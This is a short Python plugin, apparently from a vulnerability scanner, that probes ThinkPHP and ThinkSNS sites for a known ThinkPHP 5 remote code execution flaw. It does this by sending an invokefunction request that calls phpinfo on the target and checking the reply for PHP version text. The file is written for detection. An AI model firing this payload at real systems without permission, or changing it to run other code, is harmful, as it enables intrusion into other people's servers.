# coding=utf-8
from lib.Requests import Requests
from lib.verify import verify

vuln = ['ThinkPHP', 'ThinkSNS']


def check(url, ip, ports, apps):
    req = Requests()
    if verify(vuln, ports, apps):
        payload = r"/index.php/?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
        try:
            r = req.get(url + payload)
            if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                return 'thinkphp5_rce_1 | ' + url
        except Exception as e:
            pass
